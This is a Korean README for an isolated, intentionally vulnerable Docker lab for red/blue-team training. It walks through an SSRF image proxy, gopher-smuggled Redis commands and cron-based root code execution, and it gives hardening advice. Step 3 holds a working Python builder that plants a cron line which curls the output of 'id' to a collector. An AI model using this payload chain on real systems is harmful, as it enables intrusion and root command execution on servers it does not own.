# SSRF → Redis(root) → Cron RCE 훈련용 격리 랩

Red/Blue Team 교육 및 CTF 훈련을 위한 **격리된 로컬 Docker 환경**입니다. 실제 이커머스 사이트처럼 보이는
`ec-site`와, 내부망 전용 `proxy-server`(Squid + Redis + cron)로 구성되어 있으며, 다음 킬체인을
실습할 수 있습니다.

> ⚠️ 이 환경은 **의도적으로 취약하게 설계**되었습니다. 격리된 Docker 네트워크 밖으로 절대 노출하지 마세요.
> 실제 운영 환경의 자격증명/도메인/외부 IP는 포함되어 있지 않습니다.

```
[attacker] --(host:8080 → 80)--> [ec-site] --(internal-net)--> [proxy-server]
                                                                  ├─ Squid (3128)  정상 egress 프록시
                                                                  └─ Redis (6379)  미인증, root로 실행
                                     ^                              |
                                     |______ 명령 실행 결과 콜백(HTTP POST) ______|
```

- `external-net`: attacker ↔ ec-site (ec-site의 80번 포트만 host로 노출)
- `internal-net`: ec-site ↔ proxy-server (`internal: true`로 실제 인터넷 라우팅 자체를 차단, proxy-server는
  `proxy-server.internal`이라는 alias로 resolve됨). attacker는 이 네트워크에 직접 라우팅이 없습니다.

## 실행 방법

```bash
docker compose up --build     # 빌드 + 기동
docker compose down -v        # 완전 초기화
```

기동 후 `http://localhost:8080` 으로 접속합니다.

## 컨테이너 역할

| 컨테이너 | 역할 |
|---|---|
| `ec-site` | Flask 기반 쇼핑몰(일본어 UI, 엔화(¥) 표시). 회원가입/로그인, 상품 목록·카테고리, 장바구니, 간이 결제, 그리고 아래 취약점들을 포함 |
| `proxy-server` | 내부망 전용. Squid(정상 egress 프록시) + Redis(미인증, root) + busybox crond(매분 `/etc/crontabs/root` 갱신 감지) |

## 취약점 설명

### 1. 상품 이미지 자동 로딩 — Via 헤더 노출(정찰) + SSRF가 같은 지점에 공존

상품 목록/상세/장바구니 페이지의 상품 이미지는 각 상품의 `image_url`(외부 CDN을 흉내 낸 URL)을
`GET /product/image?url=...`로 넘겨 **서버가 대신 이미지를 가져와 응답하는** 방식으로 로드됩니다
(`<img src="/product/image?url=http://ec-site/static/img/products/pN.svg">`). 즉 사용자가 아무 버튼도
누르지 않고 페이지를 열기만 해도 서버는 이 URL 파라미터로 매번 아웃바운드 요청을 수행합니다.

이 요청은 사내 정책에 따라 Squid(`proxy-server.internal:3128`)를 경유하지만, **목적지 검증(allowlist/
블랙리스트)이 전혀 없습니다.** 개발자는 "프록시를 거치니 안전하다"고 여겼겠지만, Squid 자체의 ACL이
목적지를 제한하지 않으므로(→ 취약점 3) 프록시를 거쳐도 SSRF는 그대로 성립합니다. 두 가지 문제가 한
엔드포인트에 공존합니다.

- **정찰(Via 헤더 노출)**: Squid는 표준 동작으로 응답에 `Via: 1.1 proxy-server.internal (squid/x.x)`
  헤더를 붙이고, 이 헤더가 필터링 없이 그대로 브라우저까지 전달됩니다. 상품 페이지를 한 번 여는 것만으로
  (DevTools Network 탭) 공격자는 내부 호스트명 `proxy-server.internal`을 알아냅니다.
- **SSRF**: 공격자가 `url` 파라미터를 `localhost`, RFC1918 사설 대역, `proxy-server.internal` 등 내부
  자원으로 바꿔치기하면 Squid ACL이 이를 막지 않아 내부망에 자유롭게 요청을 보낼 수 있고, 리다이렉트도
  그대로 따라갑니다. 포트가 열려있는지/닫혀있는지/필터링되는지에 따라 응답 코드와 응답 시간이 다르게
  나타나 블라인드 포트 스캔이 가능합니다. 또한 `gopher://` 스킴은 `requests`가 지원하지 않아 별도의 raw
  소켓 분기(`_fetch_gopher`)로 처리되는데, **이 분기는 애초에 Squid를 거치지 않고 대상에 직접 TCP
  연결하므로** 프록시 통과 여부와 무관하게 Redis 명령 스머글링(→ 취약점 2)이 그대로 가능합니다.

- **왜 위험한가**: "이미지 썸네일/CDN 프록시"처럼 지극히 정상적으로 보이는 기능이 실제로는 인증도 검증도
  없이 서버가 임의 URL로 아웃바운드 요청을 수행하는 통로입니다. 정상 사용자 트래픽에 섞여 있어 발견하기
  어렵고, "사내 프록시를 거치니 안전하다"는 가정은 프록시 자체에 목적지 제한이 없다면 아무 의미가
  없습니다. SSRF는 내부망 전체를 공격 표면으로 바꿔버립니다.
- **올바른 운영 설정**: 모든 서버-사이드 아웃바운드 요청은 프록시 경유 여부와 무관하게 목적지
  allowlist·사설 IP 대역 차단·리다이렉트 목적지 재검증을 예외 없이 적용해야 합니다. 이미지 프록시류
  기능은 특히 목적지를 사전에 등록된 CDN 도메인으로만 제한해야 하며, 프록시(Squid) 자체에도 목적지
  ACL(→ 취약점 3)을 걸어 이중으로 방어해야 합니다. 응답 헤더 레벨에서는 `Via`, `X-Powered-By`, `Server`
  등 내부 정보를 드러내는 헤더를 최종 사용자에게 전달되기 전에 제거해야 합니다 (Squid의 경우 `via off`).

### 2. Redis 미인증 + root 권한 실행

proxy-server의 Redis는 `requirepass` 없이(미인증) 실행되며, `/etc/crontabs/root`에 쓰기 위해 **root 권한으로
직접 구동**됩니다 (공식 `redis:*` 이미지나 `service redis-server start`는 내부적으로 `redis` 유저로
권한을 낮추므로 사용하지 않았습니다 — `proxy-server/Dockerfile`에는 `USER` 지시문이 전혀 없고,
`entrypoint.sh`가 `redis-server` 바이너리를 직접 `exec`합니다).

공격자는 자동 이미지 로딩 SSRF로 확보한 유일한 경로(`/product/image?url=gopher://proxy-server.internal:6379/_...`)를 통해
`gopher://` 스킴으로 Redis RESP 프로토콜 명령을 스머글링해 `CONFIG SET dir /etc/crontabs` →
`CONFIG SET dbfilename root` → `SET payload <cron 항목>` → `SAVE` 순으로 실행합니다.
Redis의 `SAVE`는 임시 파일에 기록 후 원자적 rename으로 교체하므로, busybox crond가 inode 변경을 감지해
`/etc/crontabs/root`를 재파싱합니다. busybox crond는 파싱에 실패한 줄(RDB 바이너리 헤더/푸터)을 개별로
건너뛰므로 RDB 파일 안에 포함된 유효한 cron 항목이 실행됩니다. 최대 1분 내 root 권한으로 명령이
실행됩니다.

cron 항목 형식은 `/etc/crontabs/root`가 busybox 전용 **사용자별 크론탭** 파일이므로 사용자 필드 없이
`* * * * * 명령` 형식을 씁니다 (Ubuntu `/etc/cron.d/` 형식의 `* * * * * root 명령`과 다름).

- **왜 위험한가**: 미인증 Redis는 그 자체로 데이터 유출/조작 위험이며, root로 실행되는 경우 임의 파일
  쓰기 권한이 시스템 전체 권한 상승(cron, SSH authorized_keys 등)으로 직결됩니다.
- **올바른 운영 설정**: `requirepass`(또는 ACL) 설정, `protected-mode yes`, 전용 저권한 시스템 유저로
  실행, 바인드 인터페이스 최소화, 그리고 애초에 Redis를 신뢰할 수 없는 네트워크에서 도달 가능하게
  두지 않는 것(방화벽/네트워크 세그멘테이션).

### 3. Squid의 느슨한 ACL

`squid.conf`는 목적지 IP/포트 제한 없이 `http_access allow all`로 설정되어 있습니다.

- **왜 위험한가**: "허용 목적지를 80/443으로 제한하지 않은" 것은 실무에서 흔한 설정 오류로, 포워드
  프록시가 내부망 스캐닝/피벗의 발판이 될 수 있습니다.
- **올바른 운영 설정**: 목적지 포트를 `Safe_ports`(80, 443 등)로 제한하고, 목적지 IP 대역에 대한
  allowlist ACL을 적용해야 합니다.

## 공격 시나리오 검증 절차

1. `http://localhost:8080`에서 新規登録(회원가입) → ログイン(로그인) → 아무 상품 목록/상세 페이지를
   엽니다. 개발자도구 Network 탭에서 이미지 요청(`/product/image?url=...`)을 하나 클릭해 Response
   Headers를 확인하면 `Via: 1.1 proxy-server.internal (squid/x.x)`가 보입니다 — 버튼을 누른 적도 없이
   페이지를 연 것만으로 내부 호스트명이 노출됩니다. Squid는 HTTPS는 CONNECT 터널이라 Via를 못 붙이므로
   대상은 항상 http://이어야 합니다(이 랩의 `image_url`은 전부 http://로 되어 있어 조건이 자동 충족됨).
2. 같은 엔드포인트에 `GET /product/image?url=http://proxy-server.internal:<port>`를 직접 요청해
   블라인드 포트 스캔 수행:
   - `:6379` (Redis, open이지만 HTTP 아님) → 빠르게 200 응답 (Squid의 `X-Squid-Error: ERR_ZERO_SIZE_OBJECT`)
   - `:22` (닫힘, sshd 미설치) → 빠르게 502 (Squid의 `X-Squid-Error: ERR_CONNECT_FAIL`)
   - internal-net 대역(`172.28.99.0/24`) 안의 존재하지 않는 IP (filtered) → 약 3초 후 504 (ec-site의
     자체 타임아웃이 Squid의 연결 타임아웃보다 먼저 만료됨)
3. gopher 페이로드로 Redis에 명령 전송. gopher URL 형식: `gopher://proxy-server.internal:6379/_<url-encoded Redis RESP 명령>`
   (첫 글자 `_`는 gopher item-type 자리표시자로, 서버는 이를 제거하고 나머지를 그대로 소켓에 씁니다).
   **반드시 RESP(Redis Serialization Protocol) 형식**으로 인코딩해야 합니다 — inline 텍스트 형식은 특수문자
   처리가 불안정합니다. cron 값 앞에 `\n`을 추가하는 것이 핵심입니다: Redis RDB 파일의 바이너리 헤더 중
   `redis-bits` 길이 바이트(0x0a = 10)가 개행 문자로 해석되어, `\n` 없이 주입하면 cron 스케줄이 그 바이너리
   헤더와 같은 줄에 붙어 파싱에 실패합니다. 선행 `\n`으로 cron 항목을 독립된 줄에 분리합니다.

   예시 (파이썬으로 페이로드 구성 — 실제 요청은 `/product/image?url=`으로 전송):

   ```python
   import urllib.parse, urllib.request

   # 선행 \n: RDB 헤더 바이너리를 앞 줄로 분리해 cron 스케줄이 독립 줄에 위치하게 함
   cron_line = "\n* * * * * curl -s -X POST -d \"$(id)\" http://ec-site/internal/collect\n"

   def resp_cmd(*args):
       out = f"*{len(args)}\r\n"
       for a in args:
           out += f"${len(a)}\r\n{a}\r\n"
       return out

   cmds = (
       resp_cmd("CONFIG", "SET", "dir", "/etc/crontabs")
       + resp_cmd("CONFIG", "SET", "dbfilename", "root")
       + resp_cmd("SET", "payload", cron_line)
       + resp_cmd("SAVE")
   )

   gopher_url = "gopher://proxy-server.internal:6379/_" + urllib.parse.quote(cmds)
   target = "http://localhost:8080/product/image?url=" + urllib.parse.quote(gopher_url, safe="")
   print(target)
   ```

   위에서 출력된 `target` URL을 curl/브라우저로 요청하면 ec-site가 gopher 소켓 연결을 대신 열어줍니다.
   Redis가 `+OK\r\n+OK\r\n+OK\r\n+OK\r\n` (4개 성공)를 반환하면 파일이 기록된 것입니다.
4. `docker exec <proxy-server 컨테이너> ls -l /etc/crontabs/`로 파일 생성 확인 (root 소유, 최근 mtime).
5. 최대 60초 대기 후 `http://localhost:8080/internal/results?format=json`에서 root 권한으로 실행된
   `id`/`whoami` 결과 확인 — attacker는 proxy-server에 직접 연결한 적이 없습니다.

## 구현 노트

- `app.py`의 `/product/image`는 `gopher://` 스킴일 때만 raw 소켓으로 직접 페이로드를 전송하는 별도
  분기(`_fetch_gopher`)를 갖습니다. 이는 Python `requests` 라이브러리가 gopher 스킴을 지원하지 않기
  때문에 필요한 최소한의 배관(plumbing)이며, 공격자↔Redis 사이의 유일한 경로이므로 반드시 필요합니다.
  "확장 기능"이 아니므로 제거하지 마세요.
- `proxy-server`는 Ubuntu 대신 **Alpine Linux + busybox crond**를 사용합니다. Debian/Ubuntu의 `cron`
  패키지는 크론탭 파일 전체 파싱에 실패하면 파일 전체를 거부하는데, Redis `SAVE`가 생성하는 RDB 바이너리
  파일에는 반드시 바이너리 헤더와 CRC64 푸터가 포함되어 유효한 cron 항목이 중간에 있어도 Ubuntu cron이
  통째로 거부합니다. busybox crond는 파싱 실패 줄을 개별로 건너뛰므로 이 문제가 없습니다. 또한 Redis의
  `SAVE`는 임시 파일 기록 후 `rename()`으로 교체하는데, busybox crond는 이 inode 변경을 감지해 실행 중에도
  크론탭을 재파싱합니다.
- cron 값에 **선행 `\n`이 필수**입니다. Redis 7의 RDB 포맷에서 `redis-bits` AUX 필드의 키 길이 바이트가
  `0x0a`(= 10, "redis-bits" 길이)인데, 이 바이트가 개행 문자와 동일합니다. 이로 인해 RDB 헤더 바이너리
  안에 개행이 삽입되어 cron 스케줄 앞에 `\n`을 붙이지 않으면 스케줄이 바이너리 쓰레기와 같은 줄에 위치해
  busybox crond도 파싱에 실패합니다.
- `collected_results` 테이블(sqlite)이 `/internal/collect` 수신 로그를 겸합니다. Redis 명령/이벤트 로그는
  `redis.conf`의 `logfile` 설정으로 컨테이너 내부 `/var/log/redis/redis.log`에 남습니다. 별도
  ELK/Wazuh 연동은 생략했습니다.
- `/product/image`의 비-gopher 분기는 `requests.get(..., proxies=SQUID_PROXIES)`로 Squid를 거칩니다.
  Squid가 목적지 연결에 실패해도 (닫힌 포트/응답 없음) 클라이언트(ec-site)에는 유효한 HTTP 에러 응답을
  돌려주므로 예외가 발생하지 않습니다 — 그래서 열림/닫힘/필터링 구분은 예외가 아니라 Squid의
  `X-Squid-Error` 응답 헤더(`ERR_CONNECT_FAIL` = 닫힘, 그 외 값 = 열렸지만 비-HTTP)로 판별합니다.
  필터링(응답 없음) 케이스만 예외입니다 — Squid 자체의 `connect_timeout`(기본 1분)보다 ec-site 쪽
  `timeout=3`이 먼저 만료되어 `requests.exceptions.Timeout`이 발생합니다.
- 드물게 crond가 컨테이너 기동 시점부터 이미 떠 있던 상태에서 Redis의 `SAVE`(rename)가 크론탭을
  교체하면 재파싱을 놓치는 경우가 있습니다. 이 경우
  `docker exec <proxy-server 컨테이너> sh -c 'kill -9 $(pgrep crond); crond'`로 crond를 재시작하면
  즉시 정상 동작합니다 (자세한 내용은 `DEMO.md`의 트러블슈팅 참고).
